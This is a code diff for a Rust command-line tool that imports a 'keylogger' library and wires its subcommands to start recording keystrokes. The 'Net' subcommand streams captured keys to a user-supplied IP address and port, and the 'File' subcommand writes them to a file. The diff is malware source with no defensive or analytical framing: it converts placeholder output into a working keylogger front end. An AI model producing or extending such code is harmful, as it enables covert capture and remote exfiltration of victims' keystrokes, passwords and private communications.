@@ -1,4 +1,5 @@
 use clap::{Args, Parser, Subcommand};
+use keylogger::{run, FileLogger, NetworkLogger};
 use std::net::IpAddr;
 
 #[derive(Parser)]
@@ -51,11 +52,23 @@ fn main() {
     let cli = Cli::parse();
     match &cli.command {
         Commands::Net(args) => {
-            println!("ipv4_addr: {:?}", args.ipv4_addr);
-            println!("port: {:?}", args.port);
+            let logger = match NetworkLogger::new(args.ipv4_addr, args.port) {
+                Ok(logger) => logger,
+                Err(e) => {
+                    eprintln!("error: {}", e);
+                    std::process::exit(1);
+                }
+            };
+            if let Err(e) = run(Box::new(logger)) {
+                eprintln!("error: {}", e);
+                std::process::exit(1);
+            }
         }
         Commands::File(args) => {
-            println!("recorder_file: {:?}", args.recorder_file);
+            if let Err(e) = run(Box::new(FileLogger::new(args.recorder_file.clone()))) {
+                eprintln!("error: {}", e);
+                std::process::exit(1);
+            }
         }
     }
 }
